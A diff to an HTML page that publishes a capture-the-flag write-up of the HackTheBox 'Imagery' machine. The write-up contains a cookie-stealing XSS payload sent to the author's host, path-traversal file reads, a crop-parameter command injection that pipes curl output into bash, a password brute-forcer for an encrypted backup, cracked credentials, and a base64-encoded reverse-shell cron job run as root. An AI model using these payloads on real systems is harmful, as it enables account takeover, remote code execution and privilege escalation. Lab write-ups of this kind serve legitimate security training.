@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Imagery - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Imagery.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Imagery machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for Imagery machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, Imagery, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,372 @@
         <h1 class="writeup-title">Imagery</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">January 24, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
                 <p><img alt="pwned" src="../images/Imagery/pwned.png" /></p>
-<p>Imagery is an ACTIVE machine!</p>
-<p>This write-up will go live once Imagery retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+<p>Imagery was a medium-difficulty Linux machine that began with discovering a Flask-based online image gallery on port 8000.
+After creating a test account and identifying the framework through its 404 error page, I discovered a stored XSS vulnerability in the report functionality where an admin would review submitted reports.
+I crafted an XSS payload <code>&lt;img src=x onerror="document.location='http://10.10.16.92:8000/XSS?c='+document.cookie"&gt;</code> that, when reviewed by the admin, exfiltrated their session cookie to my Python HTTP server, granting me admin access to the application.</p>
+<p>As admin, I found a log download feature in the admin panel that was vulnerable to Local File Inclusion (LFI). By manipulating the log_identifier parameter with path traversal (../../../../etc/passwd), I could read arbitrary files on the system.
+I leveraged this to download the Flask application source code (app.py, config.py) and the JSON database file (db.json), which contained MD5-hashed credentials for admin and testuser accounts.
+Using CrackStation, I cracked the testuser hash (testuser@imagery.htb:iambatman) and logged in to discover that test users had access to work-in-progress image transformation features that were locked for regular users.</p>
+<p>Examining the transform operations, I found a command injection vulnerability in the crop function where user-controlled parameters (x, y, width, height) were passed directly into an ImageMagick convert command with shell=True.
+I exploited this using backtick command substitution in the x parameter: "x":"0<code>curl http://10.10.16.92:8000/sh|bash</code>", which executed before the ImageMagick operation and granted me a reverse shell as the web user.</p>
+<p>While exploring the filesystem, I discovered an AES-encrypted backup file in /var/backup/ (web_20250806_120723.zip.aes).
+I transferred it to my machine and wrote a Python brute-forcing script using the pyAesCrypt library to crack the encryption password (bestfriends).
+The decrypted backup contained an older version of db.json with additional user credentials. I cracked the MD5 hashes for two new users—mark (supersmash) and web (spiderweb1234).
+Since SSH password authentication was disabled, I used su from my web shell to switch to the mark user and obtained the user flag.</p>
+<p>As mark, I ran sudo -l and discovered I could execute /usr/bin/charcol as root—a custom backup utility I'd never encountered before.
+Running charcol with the shell flag prompted for a master passphrase, which I reset using the -R flag with mark's system password.
+After resetting to "no password mode" for convenience, I entered the charcol interactive shell and explored its capabilities.
+I identified the auto add command that could create cron jobs managed by charcol without validating the safety of executed commands.
+I created a malicious cron job scheduled to run every minute: auto add --schedule "5star" --command 'echo "YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOTIvOTAwMiAwPiYxJwo=" | base64 -d | bash' --name legit, which decoded and executed a base64-encoded reverse shell payload.
+After waiting for the cron job to trigger, I received a root shell and captured the root flag.</p>
+<h1>User Flag</h1>
+<p><img alt="nmap" src="../images/Imagery/nmap.png" /></p>
+<p>Initial nmap scan reveals only 2 open ports. SSH on 22 and a website on 8000.</p>
+<h1>Enumerating The Website</h1>
+<p><img alt="website" src="../images/Imagery/website.png" /></p>
+<p>Looks like a fairly standard website, in this case, for an online gallery. Trying to reach a nonexistent endpoint reveals a standard 404 page belonging to Flask.</p>
+<p><a href="https://0xdf.gitlab.io/cheatsheets/404#flask">https://0xdf.gitlab.io/cheatsheets/404#flask</a></p>
+<p><img alt="flask" src="../images/Imagery/flask.png" /></p>
+<p>I created an account of <code>test:test</code>, and logged into it.</p>
+<p><img alt="upload" src="../images/Imagery/upload.png" /></p>
+<p>I can upload a file, limited to common image formats and 1MB in size. I'll upload a random image to see what I can do with it.</p>
+<p><img alt="uploaded" src="../images/Imagery/uploaded.png" /></p>
+<p>Most options are greyed out, throwing a <code>still in production</code> error. The file's download link is <code>http://10.129.7.222:8000/uploads/86c91abf-4492-45f3-8e0f-66cca2bc7d86_favicon.png</code>, and I can't find a way to upload a malicious file.</p>
+<h2>XSS In The Report Functionality</h2>
+<p>Under the quick links section at the bottom of the page, I see a report functionality.</p>
+<p><img alt="report" src="../images/Imagery/report.png" /></p>
+<p>Apparently, an admin will review the sent reports, which opens a path for XSS cookie theft here.</p>
+<p><code>&lt;img src=x onerror="document.location='http://10.10.16.92:8000/XSS?c='+document.cookie"&gt;</code></p>
+<p>I used this payload in both report fields. If an admin sees it, their browser will reach out to my Python server, sharing the admin's cookie while trying to find /XSS.</p>
+<p><img alt="xss" src="../images/Imagery/xss.png" /></p>
+<p>After swapping my cookie with the admin's, a new button has been revealed on the main page.</p>
+<p><img alt="admin" src="../images/Imagery/admin.png" /></p>
+<h2>LFI In The Admin Panel</h2>
+<p><img alt="logs" src="../images/Imagery/logs.png" /></p>
+<p>The admin panel allows me to manage users, as well as download some logs. I'll have a look into them.</p>
+<p><img alt="userlogs" src="../images/Imagery/userlogs.png" /></p>
+<p>Seems like these are just user authentication logs. However, the download link itself looks like it could be vulnerable to LFI.</p>
+<p><img alt="download" src="../images/Imagery/download.png" /></p>
+<p>I will swap the logfile with a path traversal payload, searching for <code>etc/passwd.</code></p>
+<p><code>GET /admin/get_system_log?log_identifier=../../../../etc/passwd</code></p>
+<p><img alt="lfi" src="../images/Imagery/lfi.png" /></p>
+<p>LFI confirmed! I can now download any file on the box that the underlying user has access to. Since this is a Flask app, I will start by grabbing the <code>app.py</code> file.</p>
+<p><code>GET /admin/get_system_log?log_identifier=../app.py</code></p>
+<pre class="codehilite"><code>from flask import Flask, render_template
+import os
+import sys
+from datetime import datetime
+from config import *
+from utils import _load_data, _save_data
+from utils import *
+from api_auth import bp_auth
+from api_upload import bp_upload
+from api_manage import bp_manage
+from api_edit import bp_edit
+from api_admin import bp_admin
+from api_misc import bp_misc
+
+app_core = Flask(__name__)
+app_core.secret_key = os.urandom(24).hex()
+app_core.config['SESSION_COOKIE_HTTPONLY'] = False
+
+app_core.register_blueprint(bp_auth)
+app_core.register_blueprint(bp_upload)
+app_core.register_blueprint(bp_manage)
+app_core.register_blueprint(bp_edit)
+app_core.register_blueprint(bp_admin)
+app_core.register_blueprint(bp_misc)
+
+@app_core.route('/')
+def main_dashboard():
+    return render_template('index.html')
+
+if __name__ == '__main__':
+    current_database_data = _load_data()
+    default_collections = ['My Images', 'Unsorted', 'Converted', 'Transformed']
+    existing_collection_names_in_database = {g['name'] for g in current_database_data.get('image_collections', [])}
+    for collection_to_add in default_collections:
+        if collection_to_add not in existing_collection_names_in_database:
+            current_database_data.setdefault('image_collections', []).append({'name': collection_to_add})
+    _save_data(current_database_data)
+    for user_entry in current_database_data.get('users', []):
+        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f&quot;{user_entry['username']}.log&quot;)
+        if not os.path.exists(user_log_file_path):
+            with open(user_log_file_path, 'w') as f:
+                f.write(f&quot;[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\n&quot;)
+    port = int(os.environ.get(&quot;PORT&quot;, 8000))
+    if port in BLOCKED_APP_PORTS:
+        print(f&quot;Port {port} is blocked for security reasons. Please choose another port.&quot;)
+        sys.exit(1)
+    app_core.run(debug=False, host='0.0.0.0', port=port)
+</code></pre>
+
+<p>There is no mention of a database(by name) in this file... But I can see that it is importing something from a config file. I will try to grab that as well.</p>
+<p><code>GET /admin/get_system_log?log_identifier=../config.py</code></p>
+<pre class="codehilite"><code>import os
+import ipaddress
+
+DATA_STORE_PATH = 'db.json'
+UPLOAD_FOLDER = 'uploads'
+SYSTEM_LOG_FOLDER = 'system_logs'
+
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin'), exist_ok=True)
+os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'converted'), exist_ok=True)
+os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'transformed'), exist_ok=True)
+os.makedirs(SYSTEM_LOG_FOLDER, exist_ok=True)
+
+MAX_LOGIN_ATTEMPTS = 10
+ACCOUNT_LOCKOUT_DURATION_MINS = 1
+
+ALLOWED_MEDIA_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'pdf'}
+ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff'}
+ALLOWED_UPLOAD_MIME_TYPES = {
+    'image/jpeg',
+    'image/png',
+    'image/gif',
+    'image/bmp',
+    'image/tiff',
+    'application/pdf'
+}
+ALLOWED_TRANSFORM_MIME_TYPES = {
+    'image/jpeg',
+    'image/png',
+    'image/gif',
+    'image/bmp',
+    'image/tiff'
+}
+MAX_FILE_SIZE_MB = 1
+MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024
+
+BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
+BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')
+
+FORBIDDEN_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh', 'bat', 'cmd', 'js', 'jsp', 'asp', 'aspx', 'cgi', 'pl', 'py', 'rb', 'dll', 'vbs', 'vbe', 'jse', 'wsf', 'wsh', 'psc1', 'ps1', 'jar', 'com', 'svg', 'xml', 'html', 'htm'}
+BLOCKED_APP_PORTS = {8080, 8443, 3000, 5000, 8888, 53}
+OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}
+PRIVATE_IP_RANGES = [
+    ipaddress.ip_network('127.0.0.0/8'),
+    ipaddress.ip_network('172.0.0.0/12'),
+    ipaddress.ip_network('10.0.0.0/8'),
+    ipaddress.ip_network('169.254.0.0/16')
+]
+AWS_METADATA_IP = ipaddress.ip_address('169.254.169.254')
+IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
+EXIFTOOL_PATH = '/usr/bin/exiftool
+</code></pre>
+
+<p>The website is using exiftool and imagemagick_convert somewhere... Expected from an image gallery. Aside from that, I see the database, and it is saved in a JSON format. I will grab it right away.</p>
+<p><code>GET /admin/get_system_log?log_identifier=../db.json</code></p>
+<pre class="codehilite"><code>{                                                                                                                                                                                                                                           
+    &quot;users&quot;: [                                                                                                                                                                                                                              
+        {                                                                                                                                                                                                                                   
+            &quot;username&quot;: &quot;admin@imagery.htb&quot;,                                                                                                                                                                                                
+            &quot;password&quot;: &quot;5d9c1d507a3f76af1e5c97a3ad1eaa31&quot;,                                                                                                                                                                                 
+            &quot;isAdmin&quot;: true,                                                                                                                                                                                                                
+            &quot;displayId&quot;: &quot;a1b2c3d4&quot;,                                                                                                                                                                                                        
+            &quot;login_attempts&quot;: 0,                                                                                                                                                                                                            
+            &quot;isTestuser&quot;: false,                                                                                                                                                                                                            
+            &quot;failed_login_attempts&quot;: 0,                                                                                                                                                                                                     
+            &quot;locked_until&quot;: null                                                                                                                                                                                                            
+        },                                                                                                                                                                                                                                  
+        {                                                                                                                                                                                                                                   
+            &quot;username&quot;: &quot;testuser@imagery.htb&quot;,                                                                                                                                                                                             
+            &quot;password&quot;: &quot;2c65c8d7bfbca32a3ed42596192384f6&quot;,                                                                                                                                                                                 
+            &quot;isAdmin&quot;: false,                                                                                                                                                                                                               
+            &quot;displayId&quot;: &quot;e5f6g7h8&quot;,                                                                                                                                                                                                        
+            &quot;login_attempts&quot;: 0,                                                                                                                                                                                                            
+            &quot;isTestuser&quot;: true,                                                                                                                                                                                                             
+            &quot;failed_login_attempts&quot;: 0,                                                                                                                                                                                                     
+            &quot;locked_until&quot;: null                                                                                                                                                                                                            
+        }                                                                                                                                                                                                                                   
+    ],                                                                                                                                                                                                                                      
+    &quot;images&quot;: [],                                                                                                                                                                                                                           
+    &quot;image_collections&quot;: [                                                                                                                                                                                                                  
+        {                                                                                                                                                                                                                                   
+            &quot;name&quot;: &quot;My Images&quot;                                                                                                                                                                                                             
+        },                                                                                                                                                                                                                                  
+        {                                                                                                                                                                                                                                   
+            &quot;name&quot;: &quot;Unsorted&quot;                                                                                                                                                                                                              
+        },
+        {
+            &quot;name&quot;: &quot;Converted&quot;
+        },
+        {
+            &quot;name&quot;: &quot;Transformed&quot;
+        }
+    ],
+    &quot;bug_reports&quot;: []
+}
+</code></pre>
+
+<p>This DB contains hashed credentials for admin and testuser. These look like MD5 hashes, so I'll use CrackStation to crack them.</p>
+<p><a href="https://crackstation.net/">https://crackstation.net/</a></p>
+<p><img alt="crackstation" src="../images/Imagery/crackstation.png" /></p>
+<p><code>testuser@imagery.htb | iambatman</code></p>
+<h2>Looking For Code Execution</h2>
+<p>I'll log in as the test user. There were a few functions in the image gallery that were locked out due to being WIP. There is a chance that the test user has access to these, because it <em>is</em> a test user.</p>
+<p><img alt="unlocked" src="../images/Imagery/unlocked.png" /></p>
+<p>Confirmed! Out of all these options, <code>transform image</code> sounds like it would use the mentioned binaries to perform operations on the file. The others focus on metadata(exiftool), as well as extension and details modification.</p>
+<p>This option holds 5 different operations: Crop, Rotate, Saturation, Brightness, Contrast. I'll check each of them one by one.</p>
+<h3>Command Injection In The Crop Operation</h3>
+<p><img alt="crop" src="../images/Imagery/crop.png" /></p>
+<p>The user-controlled params seem to be passed into ImageMagick. I'll poke around them to see what's permitted and what's not.</p>
+<p><img alt="backticks" src="../images/Imagery/backticks.png" /></p>
+<p>In bash, the <code>backticks</code> are used for command substitution. This is used to run whatever is in the backticks before the rest of the command, and replace the "backticked" piece with its result. For example:</p>
+<pre class="codehilite"><code>ls /home/`whoami`
+</code></pre>
+
+<p>Will become <code>ls /home/USER</code>, as the result of <code>whoami</code> will be the current user's name.</p>
+<p>Here, I don't really care what happens to the convert command afterwards. Using backticks allows me to run the curl command before the operation commences, even if it crashes or breaks further on.</p>
+<pre class="codehilite"><code>&quot;x&quot;:&quot;0`curl http://10.10.16.92:8000/sh|bash`&quot;
+</code></pre>
+
+<p><img alt="shell" src="../images/Imagery/shell.png" /></p>
+<p>This results in a shell as the web user. Looking at the landing directory, I can see the webapp's source code.</p>
+<p><img alt="sc" src="../images/Imagery/sc.png" /></p>
+<p>The <code>api_edit.py</code> file contains source code for the image edition operations.</p>
+<p><img alt="edit" src="../images/Imagery/edit.png" /></p>
+<pre class="codehilite"><code>        if transform_type == 'crop':
+            x = str(params.get('x'))
+            y = str(params.get('y'))
+            width = str(params.get('width'))
+            height = str(params.get('height'))
+            command = f&quot;{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}&quot;
+            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
+</code></pre>
+
+<p>This is the only operation that takes the user-controlled params and uses them in the ImageMagick command. Notice that the <code>shell</code> env variable is set to true, which will cause the curly braces to be processed first before running the command. Kinda similar to the backticks trick from earlier!</p>
+<h2>Cracking The AES-Encrypted Backup</h2>
+<p>I looked through the filesystem, and found a non-standard directory in <code>/var</code></p>
+<p><img alt="backup" src="../images/Imagery/backup.png" /></p>
+<p>I'll transfer this file onto my box with the following commands:</p>
+<pre class="codehilite"><code>cat web_20250806_120723.zip.aes &gt; /dev/tcp/10.10.16.92/9001
+
+nc -lnkvp 9001 &gt; web_20250806_120723.zip.aes
+</code></pre>
+
+<p><img alt="file" src="../images/Imagery/file.png" /></p>
+<p>Knowing that this file was encrypted with the <code>pyAesCrypt</code> library, I wrote a simple bruteforcer running <code>pyAesCrypt.decryptFile</code> against the file.</p>
+<p><a href="https://github.com/marcobellaccini/pyAesCrypt">https://github.com/marcobellaccini/pyAesCrypt</a></p>
+<pre class="codehilite"><code># brute_aes.py
+
+import pyAesCrypt
+
+def brute_force(encrypted_file, wordlist_file):
+    print(f&quot;[*] Starting brute force on: {encrypted_file}&quot;)
+    print(f&quot;[*] Using wordlist: {wordlist_file}&quot;)
+
+    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
+        for i, line in enumerate(f, 1):
+            password = line.strip()
+
+            if i % 1000 == 0:
+                print(f&quot;[*] Tried {i} passwords...&quot;)
+
+            try:
+                pyAesCrypt.decryptFile(encrypted_file, &quot;decrypted_output.zip&quot;, password)
+                print(f&quot;\n[+] SUCCESS! Password found: {password}&quot;)
+                print(f&quot;[+] Decrypted file saved as: decrypted_output.zip&quot;)
+                return password
+            except ValueError:
+                # Wrong password, continue
+                pass
+
+    print(f&quot;\n[-] Password not found after {i} attempts&quot;)
+    return None
+
+if __name__ == &quot;__main__&quot;:
+    encrypted_file = &quot;web_20250806_120723.zip.aes&quot;
+    wordlist = input(&quot;Enter wordlist file path: &quot;).strip()
+
+    brute_force(encrypted_file, wordlist)
+</code></pre>
+
+<p><img alt="decrypted" src="../images/Imagery/decrypted.png" /></p>
+<p><code>archive | bestfriends</code></p>
+<p>The archive unzips into a backup of the <code>web</code> directory, the same one I landed in after getting the web user shell.</p>
+<p><img alt="backupun" src="../images/Imagery/backupun.png" /></p>
+<p>I looked into the db.json file first, remembering that it holds user credentials.</p>
+<p><img alt="new" src="../images/Imagery/new.png" /></p>
+<p>There are 2 new users in this file, web and mark. I'll send both hashes to CrackStation.</p>
+<p><img alt="crackstation2" src="../images/Imagery/crackstation2.png" /></p>
+<p><code>mark | supersmash</code></p>
+<p><code>web | spiderweb1234</code></p>
+<p>After grabbing the /etc/passwd file earlier, I took notice of the users who had a shell on the box. One of the users I noticed was <code>mark</code>, so I'll try to SSH as him into the box.</p>
+<p><img alt="sshfail" src="../images/Imagery/sshfail.png" /></p>
+<p>This fails because password authentication for SSH is disabled on Imagery. I can <code>su</code> into Mark from my web shell, so this is not a problem.</p>
+<p><img alt="user" src="../images/Imagery/user.png" /></p>
+<h1>Root flag</h1>
+<p>I wanted to inject an SSH key into Mark's authorized_keys directory, but that did not bring success.</p>
+<p><img alt="sshfail2" src="../images/Imagery/sshfail2.png" /></p>
+<p>I'll just keep using my revshell then.</p>
+<h2>Charcol Exploitation</h2>
+<p><img alt="sudol" src="../images/Imagery/sudol.png" /></p>
+<p>Mark can run <code>charcol</code> as root. I'll run it to see what it is, as I've never seen it before.</p>
+<p><img alt="charcol" src="../images/Imagery/charcol.png" /></p>
+<p>Right away, I can see the shell flag. Using this flag prompts for a master passphrase.</p>
+<p><img alt="master" src="../images/Imagery/master.png" /></p>
+<p>It can be reset with the -R flag, which requires the system password(which I have for Mark).</p>
+<p><img alt="reset" src="../images/Imagery/reset.png" /></p>
+<p>Now I'll rerun charcol, choosing the no password mode for convenience.</p>
+<p><img alt="charcol2" src="../images/Imagery/charcol2.png" /></p>
+<p>Success! I am now in the charcol interactive shell.</p>
+<h2>Abusing Charcol For Root Code Execution</h2>
+<p>There are at least 2 commands I can use for potential escalation. One of them is <code>Fetch</code></p>
+<pre class="codehilite"><code>    fetch &lt;url&gt; [-o &lt;output_file&gt;] [-p &lt;file_password&gt;] [-f] [--ask-password]
+      Purpose: Download a file from a URL, encrypt it, and save it.
+      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/fetched_file'.
+      Permissions: Files created with 664 permissions. Ownership is current user:group.
+      Restrictions: Fetching from loopback addresses (e.g., localhost, 127.0.0.1) is blocked.
+      Encryption:
+        - If '--app-password' is set (status 1) and no '-p &lt;file_password&gt;' is given, uses the application password for encryption.
+        - If 'no password' mode is set (status 2) and no '-p &lt;file_password&gt;' is given, creates an UNENCRYPTED file.
+      Examples:
+        - Encrypted:
+          fetch &lt;URL&gt; -o &lt;output_file_path&gt; -p &lt;file_password&gt; --force
+        - Unencrypted (if status 2 and no -p):
+          fetch &lt;URL&gt; -o &lt;output_file_path&gt;
+</code></pre>
+
+<p>With this, I can overwrite files on the box with my local ones. It can be any file, with the exception of the /root directory, /etc/shadow, and probably a bunch of other files. This is what I initially tried with overwriting the crontab. However, while I managed to do so, the command was not executed.</p>
+<p><img alt="crontab" src="../images/Imagery/crontab.png" /></p>
+<p>The other command is <code>auto add</code>, allowing me to add cronjobs managed by charcol.</p>
+<pre class="codehilite"><code>  Automated Jobs (Cron):
+    auto add --schedule &quot;&lt;cron_schedule&gt;&quot; --command &quot;&lt;shell_command&gt;&quot; --name &quot;&lt;job_name&gt;&quot; [--log-output &lt;log_file&gt;]
+      Purpose: Add a new automated cron job managed by Charcol.
+      Verification:
+        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
+        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
+      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
+      Examples:
+        - Status 1 (encrypted app password), cron:
+          CHARCOL_NON_INTERACTIVE=true charcol --app-password &lt;app_password&gt; auto add \
+          --schedule &quot;0 2 * * *&quot; --command &quot;charcol backup -i /home/user/docs -p &lt;file_password&gt;&quot; \
+          --name &quot;Daily Docs Backup&quot; --log-output &lt;log_file_path&gt;
+        - Status 2 (no app password), cron, unencrypted backup:
+          CHARCOL_NON_INTERACTIVE=true charcol auto add \
+          --schedule &quot;0 2 * * *&quot; --command &quot;charcol backup -i /home/user/docs&quot; \
+          --name &quot;Daily Docs Backup&quot; --log-output &lt;log_file_path&gt;
+        - Status 2 (no app password), interactive:
+          auto add --schedule &quot;0 2 * * *&quot; --command &quot;charcol backup -i /home/user/docs&quot; \
+          --name &quot;Daily Docs Backup&quot; --log-output &lt;log_file_path&gt;
+          (will prompt for system password)
+</code></pre>
+
+<p><code>auto add --schedule "* * * * *" --command 'echo "YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOTIvOTAwMiAwPiYxJwo=" | base64 -d | bash' --name legit</code></p>
+<p>This will be my malicious cronjob.</p>
+<p><img alt="job" src="../images/Imagery/job.png" /></p>
+<p>And after a while, I got a hit on my listener.</p>
+<p><img alt="root" src="../images/Imagery/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -87,7 +443,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
